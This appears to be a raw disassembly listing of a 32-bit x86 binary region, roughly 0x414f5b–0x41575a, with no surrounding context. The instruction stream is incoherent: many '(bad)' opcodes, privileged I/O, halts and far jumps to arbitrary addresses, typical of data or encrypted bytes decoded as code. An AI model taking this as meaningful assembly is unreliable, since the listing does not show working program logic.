  414f5b:	mov    DWORD PTR ds:0x652d538f,eax
  414f61:	repz and eax,0x58289ca1
  414f67:	js     0x414f0f
  414f69:	mov    al,ds:0xd95e4f10
  414f6e:	mov    fs,WORD PTR [ebp+0x3e7b8fd0]
  414f74:	xor    DWORD PTR [si],ebp
  414f77:	mov    eax,ds:0xd94630d8
  414f7c:	leave  
  414f7d:	repnz sub DWORD PTR ds:[esi+0x15],ebx
  414f82:	lods   eax,DWORD PTR ds:[esi]
  414f83:	cmp    BYTE PTR [esi+0xe01769c],0x5a
  414f8a:	hlt    
  414f8b:	and    ebp,DWORD PTR [esp+ebp*4+0x21d6d19f]
  414f92:	jle    0x414fb6
  414f94:	test   BYTE PTR [eax+0x365efe52],dh
  414f9a:	push   esp
  414f9b:	push   es
  414f9c:	mov    bh,0xc
  414f9e:	sbb    ebx,DWORD PTR [eax]
  414fa0:	(bad)  
  414fa1:	pusha  
  414fa2:	xchg   DWORD PTR [eax+0x1b2c4d65],ebp
  414fa8:	and    DWORD PTR [ebx],edi
  414faa:	out    dx,al
  414fab:	mov    cl,0xe5
  414fad:	hlt    
  414fae:	js     0x41501c
  414fb0:	aad    0xdf
  414fb2:	inc    edx
  414fb3:	mov    eax,ds:0x49280853
  414fb8:	dec    eax
  414fb9:	sbb    dl,bl
  414fbb:	popf   
  414fbc:	and    ah,BYTE PTR [ebx+0x2e5ef67d]
  414fc2:	fidivr WORD PTR [eax+0x71]
  414fc5:	push   esi
  414fc6:	cmp    eax,0x40246ba8
  414fcb:	mov    eax,ds:0xb1dd50a3
  414fd0:	and    ebx,edx
  414fd2:	mov    edi,0x43cc5e22
  414fd7:	ss xor eax,0x78b687ae
  414fdd:	pusha  
  414fde:	jno    0x414f7a
  414fe0:	imul   eax,DWORD PTR [esi+0x127e328c],0xffffffe6
  414fe7:	and    al,0x5e
  414fe9:	inc    edi
  414fea:	xchg   bx,ax
  414fec:	retf   
  414fed:	mov    eax,ds:0x607ab403
  414ff2:	cmp    dl,BYTE PTR [eax+0x65bb6bec]
  414ff8:	scas   al,BYTE PTR es:[edi]
  414ff9:	and    ch,dh
  414ffb:	sbb    eax,0x70939d4d
  415000:	jb     0x41504e
  415002:	scas   eax,DWORD PTR es:[edi]
  415003:	mov    al,ds:0x812f4085
  415008:	push   ebp
  415009:	inc    edx
  41500a:	mov    ch,0x25
  41500c:	pop    esi
  41500d:	les    edi,FWORD PTR [ebx+ebx*2-0x6e]
  415011:	add    esp,DWORD PTR [edx+esi*8+0x64cc609f]
  415018:	leave  
  415019:	adc    eax,0xde2b6ad5
  41501e:	out    dx,al
  41501f:	inc    esp
  415020:	dec    ebp
  415021:	and    ebx,DWORD PTR [edx-0xd]
  415024:	pop    esp
  415025:	jecxz  0x414fe2
  415027:	mov    al,ds:0x13f89c9e
  41502c:	sbb    cl,0x46
  41502f:	bound  esi,QWORD PTR [edx]
  415031:	arpl   cx,cx
  415033:	lods   al,BYTE PTR ds:[esi]
  415034:	loope  0x415096
  415036:	mov    bl,0x4a
  415038:	push   esp
  415039:	mov    edi,0x5f952055
  41503e:	mov    ds:0x7e765b04,eax
  415043:	jecxz  0x414fdb
  415045:	test   al,0x27
  415047:	or     DWORD PTR [ebp-0x55],ebx
  41504a:	sbb    dh,ch
  41504c:	mov    bh,BYTE PTR es:[ebx+0xe4371f9]
  415053:	push   0x9e6143c1
  415058:	addr16 popa 
  41505a:	in     eax,0xfb
  41505c:	pop    edx
  41505d:	imul   esp,esp,0xffffffc1
  415060:	pop    esi
  415061:	cmp    edi,ebx
  415063:	shr    BYTE PTR [edx+0xc396223],cl
  415069:	jnp    0x415071
  41506b:	cmp    eax,0x93616168
  415070:	cmp    BYTE PTR [esi],bl
  415072:	idiv   edx
  415074:	pop    esi
  415075:	ins    BYTE PTR es:[edi],dx
  415076:	push   0xffffffd3
  415078:	push   0xffffff9b
  41507a:	call   0x1b68e409
  41507f:	mov    eax,ds:0x8a523f45
  415084:	adc    DWORD PTR [ebp-0x5a],ebp
  415087:	lahf   
  415088:	pop    ebp
  415089:	add    edi,edi
  41508b:	and    ah,BYTE PTR [ebx-0x20]
  41508e:	jb     0x4150a3
  415090:	ror    BYTE PTR cs:[ebp-0x5f],cl
  415094:	mov    bl,0x85
  415096:	in     eax,0xb
  415098:	sbb    al,0xa7
  41509a:	adc    ecx,DWORD PTR [ebp-0x42]
  41509d:	stc    
  41509e:	cmp    al,0x91
  4150a0:	pop    esi
  4150a1:	pushf  
  4150a2:	mov    dh,0x41
  4150a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150a5:	dec    eax
  4150a6:	ror    BYTE PTR [eax+0x2a],1
  4150a9:	popa   
  4150aa:	cmp    DWORD PTR [eax-0x786d3047],esi
  4150b0:	mov    al,ds:0x7d4cee08
  4150b5:	call   0x4d5bacee
  4150ba:	cdq    
  4150bb:	hlt    
  4150bc:	retf   
  4150bd:	and    ebp,DWORD PTR [ebx-0x4d80fe59]
  4150c3:	cmp    al,0x64
  4150c5:	ds mov dh,0x18
  4150c8:	sahf   
  4150c9:	pop    ecx
  4150ca:	ret    0xcb48
  4150cd:	pusha  
  4150ce:	jmp    0xb35894f1
  4150d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150d4:	jg     0x415134
  4150d6:	or     DWORD PTR [edi],edx
  4150d8:	or     esp,ecx
  4150da:	stc    
  4150db:	sub    ch,BYTE PTR ds:0x267eee1f
  4150e1:	out    dx,al
  4150e2:	mov    eax,ds:0xd7d9e938
  4150e7:	mov    al,ds:0xd45dace3
  4150ec:	ds jp  0x4150f0
  4150ef:	sbb    BYTE PTR [esi-0x2f],bl
  4150f2:	mov    edx,0x920145db
  4150f7:	test   al,0x54
  4150f9:	popa   
  4150fa:	rol    BYTE PTR [edx],cl
  4150fc:	or     al,0x48
  4150fe:	loop   0x415155
  415100:	jg     0x41509d
  415102:	out    dx,al
  415103:	add    dl,al
  415105:	jnp    0x415138
  415107:	mov    ds:0xa0aa3657,al
  41510c:	fs push 0xca20d4e
  415112:	add    al,0xae
  415114:	cmp    ah,BYTE PTR [esi]
  415116:	data16 cld 
  415118:	push   edx
  415119:	mov    ebp,0x117f46ae
  41511e:	das    
  41511f:	dec    esi
  415120:	js     0x415173
  415122:	mov    edi,0x4b0ff463
  415127:	pop    ds
  415128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415129:	aam    0xa6
  41512b:	xchg   esi,eax
  41512c:	cmp    bl,ah
  41512e:	out    dx,al
  41512f:	inc    esi
  415130:	push   cs
  415131:	test   al,0xab
  415133:	add    DWORD PTR [esi],ebp
  415135:	cmp    al,0x7d
  415137:	mov    eax,ds:0xf57f908c
  41513c:	loope  0x41518b
  41513e:	push   cs
  41513f:	cdq    
  415140:	pop    esi
  415141:	or     eax,0x446dbf8e
  415146:	pop    es
  415147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415148:	and    BYTE PTR [eax-0x6],0x20
  41514c:	add    dh,BYTE PTR [ebp-0x4e]
  41514f:	shl    ecx,1
  415151:	sbb    ebp,esi
  415153:	cli    
  415154:	test   ebx,0xc09e0414
  41515a:	cmp    esi,eax
  41515c:	das    
  41515d:	add    eax,0x5feae911
  415162:	and    ebp,DWORD PTR [bp+di]
  415165:	inc    eax
  415166:	jb     0x4151c0
  415168:	pusha  
  415169:	jno    0x41513d
  41516b:	ja     0x4151c8
  41516d:	xchg   esi,eax
  41516e:	xor    bl,bh
  415170:	scas   al,BYTE PTR es:[edi]
  415171:	pop    ds
  415172:	push   ds
  415173:	cld    
  415174:	(bad)  [edi-0x40fb5cd1]
  41517a:	or     ebx,DWORD PTR [eax+0x14]
  41517d:	imul   ebp,DWORD PTR [esi-0x11662287],0x20b27cd6
  415187:	(bad)  
  415189:	jbe    0x415198
  41518b:	jns    0x415191
  41518d:	xor    BYTE PTR ds:0xc99e79a8,dh
  415193:	and    ecx,DWORD PTR [ebx-0x2fc9a060]
  415199:	ret    
  41519a:	out    dx,al
  41519b:	mov    bh,0xd6
  41519d:	xchg   ebx,eax
  41519e:	mov    ds:0xad777bce,al
  4151a3:	mov    al,ds:0x3812ad3a
  4151a8:	ja     0x4151b7
  4151aa:	xlat   BYTE PTR ds:[ebx]
  4151ab:	mov    ah,0x5e
  4151ad:	dec    edi
  4151ae:	mov    ecx,0x7252ead0
  4151b3:	jae    0x4151af
  4151b5:	pusha  
  4151b6:	xchg   ebp,eax
  4151b7:	dec    ebp
  4151b8:	ret    
  4151b9:	xchg   ecx,eax
  4151ba:	dec    esp
  4151bb:	pop    esi
  4151bc:	inc    esp
  4151bd:	mov    bh,0x81
  4151bf:	add    edi,eax
  4151c1:	js     0x4151dd
  4151c3:	stos   DWORD PTR es:[edi],eax
  4151c4:	pusha  
  4151c5:	xchg   BYTE PTR [edi+0x56],ah
  4151c8:	cmp    BYTE PTR [esi+0x38ee426],dl
  4151ce:	pop    esi
  4151cf:	leave  
  4151d0:	in     eax,dx
  4151d1:	push   esp
  4151d2:	cld    
  4151d3:	sbb    DWORD PTR [ebx+0x59],ecx
  4151d6:	mov    ds:0x9fd8dfa1,eax
  4151db:	mov    eax,0xc812b182
  4151e0:	je     0x41517f
  4151e2:	out    dx,al
  4151e3:	or     al,bh
  4151e5:	ret    0x70d8
  4151e8:	loope  0x41524a
  4151ea:	js     0x41522b
  4151ec:	stc    
  4151ed:	fcom   st(5)
  4151ef:	sub    DWORD PTR [edx],edx
  4151f1:	xchg   esi,eax
  4151f2:	out    dx,al
  4151f3:	pop    ss
  4151f4:	and    esp,DWORD PTR [ebx+0x723504d6]
  4151fa:	pop    ds
  4151fb:	neg    bh
  4151fd:	pusha  
  4151fe:	xchg   ebx,eax
  4151ff:	(bad)  
  415201:	mov    esi,DWORD PTR [ecx+0x14]
  415204:	sbb    DWORD PTR [esi+0x7c03adee],ebx
  41520a:	ror    BYTE PTR [esi],1
  41520c:	fsub   DWORD PTR [edx]
  41520e:	into   
  41520f:	mov    al,ds:0xb094857a
  415214:	and    ah,BYTE PTR ds:0xf35e6a07
  41521a:	push   ecx
  41521b:	mov    ch,0x3c
  41521d:	lods   al,BYTE PTR ds:[esi]
  41521e:	jnp    0x4151a4
  415220:	pop    es
  415221:	inc    esp
  415222:	add    eax,0xade097a5
  415227:	scas   al,BYTE PTR es:[edi]
  415228:	(bad)  
  41522a:	(bad)  [ecx]
  41522c:	pop    esi
  41522d:	mov    ch,0x7d
  41522f:	pop    ds
  415230:	mov    bh,0xde
  415232:	inc    eax
  415233:	int    0x99
  415235:	pusha  
  415236:	cmp    BYTE PTR [edx+0x26746bc8],0x49
  41523d:	xor    DWORD PTR [ebp+0x28bd4f53],ecx
  415243:	pop    ss
  415244:	pop    esi
  415245:	cs jl  0x4151f5
  415248:	test   esp,eax
  41524a:	repnz mov al,0x91
  41524d:	inc    ebx
  41524e:	jb     0x4152c1
  415250:	push   es
  415251:	and    DWORD PTR [ebx],esp
  415253:	in     al,0x65
  415255:	xchg   edi,eax
  415256:	sar    DWORD PTR [ebx+eiz*2+0xa4590d7],0xa1
  41525e:	xor    cl,dl
  415260:	cld    
  415261:	adc    al,0x2b
  415263:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415264:	mov    edi,0xd086e866
  415269:	add    eax,0x4ae5f37e
  41526e:	out    dx,al
  41526f:	in     eax,0xa7
  415271:	mov    al,ds:0x7bc53bb5
  415276:	push   ebx
  415277:	mov    eax,ds:0xa019f09
  41527c:	mov    al,0xba
  41527e:	rol    BYTE PTR [ecx+0x29c954],0x5e
  415285:	cmp    bh,BYTE PTR gs:[edx-0x5f15b3ba]
  41528c:	xchg   ebp,eax
  41528d:	scas   eax,DWORD PTR es:[edi]
  41528e:	jl     0x4152b0
  415290:	sbb    ch,ch
  415292:	xchg   ecx,eax
  415293:	xchg   DWORD PTR [esi-0x80],ebx
  415296:	fmulp  st(4),st
  415298:	addr16 push esp
  41529a:	xor    bl,BYTE PTR [eax]
  41529c:	lods   al,BYTE PTR ds:[esi]
  41529d:	pop    ecx
  41529e:	in     eax,dx
  41529f:	jbe    0x4152e3
  4152a1:	jle    0x4152b8
  4152a3:	mov    eax,ds:0xcfb5e009
  4152a8:	pop    esi
  4152a9:	dec    ebx
  4152aa:	lahf   
  4152ab:	mul    DWORD PTR [edx+edx*2-0x63]
  4152af:	jne    0x415273
  4152b1:	pop    edi
  4152b2:	xor    ch,BYTE PTR [ebp-0x74]
  4152b5:	shl    DWORD PTR [edi-0x748f37d6],cl
  4152bb:	or     eax,0x6a1eaf44
  4152c0:	pop    esi
  4152c1:	mov    ah,0xd0
  4152c3:	clc    
  4152c4:	sub    DWORD PTR [ebx+0xa],eax
  4152c7:	or     DWORD PTR [edi+0x1be6cc9b],ebx
  4152cd:	mov    eax,ds:0x2637e526
  4152d2:	out    dx,eax
  4152d3:	sub    dh,bl
  4152d5:	in     eax,0xec
  4152d7:	loopne 0x41532e
  4152d9:	pop    ss
  4152da:	test   BYTE PTR [edx+0x43],cl
  4152dd:	popa   
  4152de:	push   ebx
  4152df:	add    DWORD PTR [eax-0x12],edi
  4152e2:	(bad)  
  4152e5:	(bad)  
  4152e6:	out    dx,al
  4152e7:	retf   
  4152e8:	(bad)  
  4152e9:	adc    ch,ch
  4152eb:	(bad)  
  4152ec:	jae    0x4152f9
  4152ee:	jmp    0x79e0:0x2b19f0a0
  4152f5:	std    
  4152f6:	fisttp WORD PTR [ecx]
  4152f8:	pop    esi
  4152f9:	mov    BYTE PTR [esi+0x43],0x2a
  4152fd:	aam    0xa3
  4152ff:	fld    QWORD PTR [ecx+0x5a]
  415302:	jns    0x4152c0
  415304:	scas   al,BYTE PTR es:[edi]
  415305:	jge    0x41536e
  415307:	mov    eax,ds:0x1ce55043
  41530c:	pop    esi
  41530d:	jg     0x41529b
  41530f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415310:	sub    DWORD PTR [edx+edx*8+0x8608674],ecx
  415317:	dec    ebx
  415318:	call   0xb268:0x15d1b704
  41531f:	mov    cl,0xd4
  415321:	inc    ecx
  415322:	cld    
  415323:	stos   DWORD PTR es:[edi],eax
  415324:	sahf   
  415325:	dec    DWORD PTR [ebp-0x67]
  415328:	pop    eax
  415329:	ret    0x9464
  41532c:	pusha  
  41532d:	xor    BYTE PTR [edx],0x2f
  415330:	pop    esi
  415331:	sbb    esp,DWORD PTR [ebx+edx*8]
  415334:	dec    edi
  415335:	cdq    
  415336:	das    
  415337:	mov    eax,ds:0x92c5db9f
  41533c:	cwde   
  41533d:	imul   ah
  41533f:	stos   DWORD PTR es:[edi],eax
  415340:	pop    esi
  415341:	nop
  415342:	xchg   edi,eax
  415343:	jnp    0x41535e
  415345:	call   0xf0f3f267
  41534a:	shl    DWORD PTR [edi-0x73bcf093],1
  415350:	popf   
  415351:	or     BYTE PTR [edx+esi*8-0x2641ec5a],0xae
  415359:	ins    BYTE PTR es:[edi],dx
  41535a:	dec    esi
  41535b:	cs pop esi
  41535d:	dec    esp
  41535e:	idiv   BYTE PTR [edi+0x3f588f9e]
  415364:	cmc    
  415365:	push   0xd85f7fa8
  41536a:	mov    edi,0x4ecccfe3
  41536f:	sbb    al,0x29
  415371:	and    ebp,esi
  415373:	push   eax
  415374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415375:	cmp    DWORD PTR ds:0xe12cf96b,edx
  41537b:	lahf   
  41537c:	in     eax,dx
  41537d:	cmc    
  41537e:	fcomp  DWORD PTR [eax+0x7e]
  415381:	mov    bh,0x8a
  415383:	sbb    eax,0x2620a93c
  415388:	sub    BYTE PTR [ebx],0xee
  41538b:	add    eax,0x3a28d8bd
  415390:	adc    BYTE PTR [eax+0x5e],bl
  415393:	leave  
  415394:	jns    0x415334
  415396:	out    dx,al
  415397:	adc    eax,0x8f028967
  41539c:	inc    edi
  41539d:	mov    dh,ah
  41539f:	call   0x813d4402
  4153a4:	mov    ebp,0xb7022b16
  4153a9:	pusha  
  4153aa:	ror    ecx,1
  4153ac:	xchg   edi,eax
  4153ad:	icebp  
  4153ae:	mov    eax,0xee8a7caa
  4153b3:	mov    edi,0x60a1e4d1
  4153b8:	(bad)  
  4153b9:	sub    eax,0x9564a199
  4153be:	cli    
  4153bf:	fist   DWORD PTR [edi+0x63e4484b]
  4153c5:	rcl    DWORD PTR [edx+0x62],0x43
  4153c9:	rol    DWORD PTR [ebx+eiz*1-0x5f0d0cf1],0x1a
  4153d1:	pop    esi
  4153d3:	aad    0x4d
  4153d5:	and    eax,0x4d5efeb5
  4153da:	jmp    0x6372:0x48a0339d
  4153e1:	pop    esi
  4153e2:	pop    es
  4153e3:	sub    edx,ebx
  4153e5:	add    eax,DWORD PTR [ecx+0x4d82ce5e]
  4153eb:	push   es
  4153ec:	pop    esi
  4153ed:	pop    ss
  4153ee:	mov    edx,0x37e8b0b9
  4153f3:	(bad)  [edx+ebx*2]
  4153f6:	int    0xe5
  4153f8:	cmc    
  4153f9:	imul   edx,edx,0xffffffb0
  4153fc:	sbb    esi,DWORD PTR [ecx-0xfa1a4a5]
  415402:	ins    DWORD PTR es:[edi],dx
  415403:	ja     0x4153f3
  415405:	jae    0x415407
  415407:	mov    ecx,0xb8727197
  41540c:	adc    al,0x8f
  41540e:	out    dx,al
  41540f:	and    al,0xed
  415411:	stos   DWORD PTR es:[edi],eax
  415412:	mov    WORD PTR [ebp+0x197c6504],ss
  415418:	pop    esi
  415419:	lahf   
  41541a:	xchg   esi,eax
  41541b:	cmp    esp,DWORD PTR ds:0x5e81e9b5
  415421:	loopne 0x415413
  415423:	mov    bl,0x20
  415425:	xor    eax,0x611b2132
  41542a:	loopne 0x4153c5
  41542c:	adc    DWORD PTR es:[edx+0x5c21efce],edi
  415433:	mov    ch,0x53
  415435:	and    DWORD PTR [eax+0x48],edi
  415438:	sbb    esp,DWORD PTR [edx+0x64b0c5ad]
  41543e:	fld    DWORD PTR [eax]
  415440:	jmp    0x50e2a72f
  415445:	outs   dx,BYTE PTR ds:[esi]
  415446:	sbb    al,BYTE PTR [ecx+0x3f530af0]
  41544c:	push   ecx
  41544d:	shr    edi,1
  41544f:	test   eax,0xf699cc9e
  415454:	cmc    
  415455:	sti    
  415456:	in     al,0xa7
  415458:	push   ecx
  415459:	mov    ebx,0x51676944
  41545e:	jle    0x4153ec
  415460:	or     al,0xa
  415462:	dec    DWORD PTR [edi+0x52]
  415465:	test   BYTE PTR [esi-0x6b17526c],ch
  41546b:	leave  
  41546c:	dec    ecx
  41546d:	popa   
  41546e:	mov    esp,0xe0d595f8
  415473:	pop    ds
  415474:	pop    ds
  415475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415476:	out    dx,al
  415477:	cdq    
  415478:	lea    esp,[esi-0x61a8364e]
  41547e:	rcl    al,1
  415480:	(bad)
  415483:	(bad)  
  415484:	jns    0x41546e
  415486:	xor    cl,ah
  415488:	sub    al,0x90
  41548a:	jo     0x415451
  41548c:	arpl   WORD PTR [edi],bp
  41548e:	out    dx,al
  41548f:	inc    eax
  415490:	jmp    0x2b76d187
  415495:	sbb    BYTE PTR [ebp+0x51696890],0x21
  41549c:	adc    esi,DWORD PTR [edi]
  41549e:	add    al,0xda
  4154a0:	push   ds
  4154a1:	mov    ds:0xfaf9deed,eax
  4154a6:	push   esp
  4154a7:	aad    0xba
  4154a9:	(bad)  
  4154aa:	pop    esi
  4154ab:	xchg   esi,eax
  4154ac:	push   cs
  4154ad:	pop    esi
  4154ae:	sti    
  4154af:	sbb    BYTE PTR [esi-0x510be286],0x37
  4154b6:	mov    dl,0x5c
  4154b8:	pop    esi
  4154b9:	and    al,0xf1
  4154bb:	push   0xffffffb2
  4154bd:	stos   DWORD PTR es:[edi],eax
  4154be:	test   BYTE PTR [edx+esi*2+0x25c68260],bl
  4154c5:	xadd   DWORD PTR [ebp+0x751dd956],edx
  4154cc:	jnp    0x41552c
  4154ce:	and    esi,DWORD PTR [eax+0x7e]
  4154d1:	mov    ds:0xa874a3d5,eax
  4154d6:	and    DWORD PTR [esi],eax
  4154d8:	rcl    DWORD PTR [ebx-0x5a],cl
  4154db:	and    DWORD PTR [esi+0x1d9b22b2],esp
  4154e1:	loope  0x415509
  4154e3:	(bad)  
  4154e4:	pop    esp
  4154e5:	add    DWORD PTR [edx],0x33614c30
  4154eb:	mov    dh,0x73
  4154ed:	js     0x4154f7
  4154ef:	mov    ds:0x7ee47a6,al
  4154f4:	push   esp
  4154f5:	lock push ebx
  4154f7:	pusha  
  4154f8:	les    esp,FWORD PTR [esi-0x42935f29]
  4154fe:	ins    DWORD PTR es:[edi],dx
  4154ff:	hlt    
  415500:	push   edx
  415501:	je     0x415502
  415503:	and    esi,DWORD PTR [esi-0x65]
  415506:	out    dx,al
  415507:	or     al,0x13
  41550a:	ret    
  41550b:	adc    BYTE PTR [esi],bl
  41550d:	xlat   BYTE PTR ds:[ebx]
  41550e:	pop    edx
  41550f:	mov    eax,ds:0xc9463d48
  415514:	ss sbb eax,0xe3538e6f
  41551a:	sub    bl,dl
  41551c:	pop    ebp
  41551d:	(bad)  
  41551e:	aas    
  41551f:	or     ebx,0xbeaf5e7d
  415525:	push   ecx
  415526:	hlt    
  415527:	mov    eax,ds:0xd7cd5229
  41552c:	mov    dh,0x31
  41552e:	xchg   ebx,eax
  41552f:	pop    ecx
  415530:	out    0x11,eax
  415532:	out    dx,al
  415533:	dec    esi
  415534:	xchg   esi,eax
  415535:	dec    ebx
  415536:	push   eax
  415537:	dec    edx
  415538:	int    0xef
  41553a:	and    DWORD PTR [ecx+0x69df2a27],0x6d6f450a
  415544:	pop    esi
  415545:	xchg   esp,eax
  415546:	int3   
  415547:	call   0x538c950d
  41554c:	mov    ah,0x4d
  41554e:	jle    0x415513
  415550:	push   0xae1c4361
  415555:	dec    eax
  415556:	fisubr DWORD PTR [ecx-0x57ec5fce]
  41555c:	mov    BYTE PTR [edi+0x448ee6e0],0x58
  415563:	nop
  415564:	push   eax
  415565:	popa   
  415566:	or     al,0xa7
  415568:	mov    cs,WORD PTR [edi-0x65]
  41556b:	jno    0x4155a9
  41556d:	mov    dl,0x51
  41556f:	ins    DWORD PTR es:[edi],dx
  415570:	hlt    
  415571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415572:	out    dx,al
  415573:	mov    bl,0x39
  415575:	dec    ebp
  415576:	adc    eax,0x1731ea2f
  41557b:	test   al,0x9a
  41557d:	out    0x8d,eax
  41557f:	repnz (bad) 
  415581:	xor    BYTE PTR [ebp+edi*4+0x69e7b898],dl
  415588:	push   0x2e5d0e7e
  41558d:	cs xchg ecx,esp
  415590:	or     DWORD PTR [ecx+0x4],esp
  415593:	add    DWORD PTR [ebp+0x341e7c66],0xe27cf068
  41559d:	jno    0x41555b
  41559f:	add    BYTE PTR [eax-0x53d131c],al
  4155a5:	mov    dh,0x74
  4155a7:	mov    eax,ds:0x30f5bbca
  4155ac:	out    0xec,al
  4155ae:	jmp    0x415567
  4155b0:	inc    edx
  4155b1:	mov    cl,0x2e
  4155b3:	mov    ds:0xac8c305e,eax
  4155b8:	xor    al,BYTE PTR [ebp+0x47]
  4155bb:	mov    eax,ds:0x3d4f048
  4155c0:	mov    esi,0x5ea24319
  4155c5:	fwait
  4155c6:	rcl    BYTE PTR [esi-0xc],1
  4155c9:	push   0x49
  4155cb:	daa    
  4155cc:	enter  0xe862,0xc4
  4155d0:	fisub  WORD PTR [ebx+0x60]
  4155d3:	inc    ebp
  4155d4:	lock loope 0x415560
  4155d7:	rcr    DWORD PTR [esi+0x2c],1
  4155da:	mov    ebp,0xe5c3763c
  4155df:	lods   al,BYTE PTR ds:[esi]
  4155e0:	outs   dx,DWORD PTR ds:[esi]
  4155e1:	test   al,0x14
  4155e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155e4:	test   al,0x20
  4155e6:	imul   esi,edx,0x27
  4155e9:	push   edi
  4155ea:	in     eax,dx
  4155eb:	fcom   DWORD PTR [edi]
  4155ed:	aas    
  4155ee:	sbb    eax,0x2ed51f10
  4155f3:	sbb    BYTE PTR [eax+0x61],al
  4155f6:	mov    ah,0xad
  4155f8:	in     al,0x9a
  4155fa:	dec    cl
  4155fc:	jmp    0x41560f
  4155fe:	out    dx,al
  4155ff:	jle    0x415640
  415601:	pop    esp
  415602:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415603:	pop    ebp
  415604:	mov    eax,ds:0x6ba0dac7
  415609:	xchg   esi,eax
  41560a:	push   esi
  41560b:	ficom  WORD PTR [eax+eiz*1]
  41560e:	jl     0x415684
  415610:	pop    esi
  415611:	stc    
  415612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415614:	jle    0x415625
  415616:	in     eax,0x90
  415618:	cmp    eax,0x905b6e4f
  41561d:	pusha  
  41561e:	aam    0x56
  415620:	out    dx,al
  415621:	ds hlt 
  415623:	fs lock or ecx,DWORD PTR fs:[edx]
  415628:	and    eax,0x157ace61
  41562d:	jb     0x415600
  41562f:	mov    eax,ds:0x2cd325a0
  415634:	push   ds
  415635:	mov    al,ds:0x7276999
  41563a:	mov    esi,0xee34b429
  41563f:	js     0x4156be
  415641:	inc    ebx
  415642:	cmp    edx,DWORD PTR [eax+esi*8]
  415645:	jo     0x4156a1
  415647:	mov    al,ds:0x1661fbc4
  41564c:	ficomp WORD PTR [edx+0x74ed5f4e]
  415652:	out    dx,al
  415653:	push   eax
  415654:	xor    BYTE PTR [edi],al
  415656:	addr16 xchg ebp,eax
  415658:	or     al,0xe8
  41565a:	push   es
  41565b:	mov    eax,ds:0x7b46591b
  415660:	aas    
  415661:	jmp    DWORD PTR [eax]
  415663:	mov    ebp,0x8f18c5e
  415668:	aam    0xb
  41566a:	rcr    bh,1
  41566c:	mov    edx,0xd71b2474
  415671:	pusha  
  415672:	xchg   esi,eax
  415673:	mov    al,ds:0xa29ed832
  415678:	push   edx
  415679:	xchg   ebp,eax
  41567a:	ror    DWORD PTR [esi+ebx*1-0x80],0x1f
  41567f:	dec    esi
  415680:	cmp    BYTE PTR [esi-0x69],dl
  415683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415684:	pop    edx
  415685:	sub    al,BYTE PTR [ebp+0x4e3b7ee1]
  41568b:	scas   eax,DWORD PTR es:[edi]
  41568c:	push   esi
  41568d:	sbb    ebp,esi
  41568f:	pusha  
  415690:	mov    edx,0x722b2610
  415695:	push   ecx
  415696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415697:	push   0xffffffe8
  415699:	pusha  
  41569a:	and    al,0x23
  41569c:	fwait
  41569d:	test   BYTE PTR [ebx],0x1e
  4156a0:	push   es
  4156a1:	inc    ebp
  4156a2:	out    dx,al
  4156a3:	cwde   
  4156a4:	xor    bh,BYTE PTR [edx-0xf]
  4156a7:	imul   eax,DWORD PTR [edx-0x7a],0x277aa0e2
  4156ae:	into   
  4156af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b0:	cs push 0x205ed6a1
  4156b6:	inc    BYTE PTR [esi]
  4156b8:	ins    BYTE PTR es:[edi],dx
  4156b9:	js     0x4156bf
  4156bb:	or     al,0xbc
  4156bd:	inc    ecx
  4156be:	les    esi,FWORD PTR es:[ebx]
  4156c1:	mov    eax,ds:0xbd78e346
  4156c6:	aam    0xb5
  4156c8:	mov    dh,0x91
  4156ca:	out    dx,eax
  4156cb:	dec    edi
  4156cc:	push   ebp
  4156cd:	scas   eax,DWORD PTR es:[edi]
  4156ce:	mov    DWORD PTR [ecx+0x59441977],eax
  4156d4:	punpcklwd mm1,DWORD PTR [esi-0x7cc90cd9]
  4156db:	cmp    DWORD PTR [edx+0x3b],ebp
  4156de:	out    dx,al
  4156df:	loopne 0x415727
  4156e1:	mov    ds:0xef9b17dc,eax
  4156e6:	xor    DWORD PTR [ecx-0x3d915c06],ebp
  4156ec:	push   es
  4156ed:	cmp    bh,cl
  4156ef:	fisttp DWORD PTR [esi+esi*8+0x7230f9ee]
  4156f6:	jno    0x4156e6
  4156f8:	aaa    
  4156f9:	lds    ebp,FWORD PTR [ecx]
  4156fb:	mov    ds:0x7102eeae,eax
  415700:	ins    BYTE PTR es:[edi],dx
  415701:	cmp    BYTE PTR [esi+0x25],cl
  415704:	in     al,0x52
  415706:	out    0x21,eax
  415708:	add    ecx,DWORD PTR [ebx+0x34]
  41570b:	sub    al,0x2e
  41570d:	ret    0x7ce4
  415710:	inc    ecx
  415711:	popa   
  415712:	cli    
  415713:	fs (bad) 
  415715:	jl     0x4156b8
  415717:	cld    
  415718:	shrd   esi,ebp,cl
  41571b:	addr16 mov eax,0x5a4ae61c
  415721:	add    al,0x6b
  415723:	retf   
  415724:	add    BYTE PTR [eax],0xdf
  415727:	inc    ecx
  415728:	pop    esi
  415729:	inc    ecx
  41572a:	loope  0x4156f0
  41572c:	cld    
  41572d:	fdivr  QWORD PTR [ecx-0x4a]
  415730:	adc    DWORD PTR [ecx+0x6d],0x48
  415734:	aaa    
  415735:	(bad)  
  415736:	stos   DWORD PTR es:[edi],eax
  415737:	out    0x3f,al
  415739:	mov    bh,0x83
  41573b:	aas    
  41573c:	sahf   
  41573d:	ret    0x7fe
  415740:	fisub  DWORD PTR fs:[ecx+ecx*8-0x9]
  415745:	mov    al,ds:0x52e82af4
  41574a:	lods   eax,DWORD PTR ds:[esi]
  41574b:	mov    al,ds:0x394e7b62
  415750:	jmp    0xb8e8:0x5e8d3533
  415757:	pusha  
  415758:	daa    
  415759:	pop    esi
  41575a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
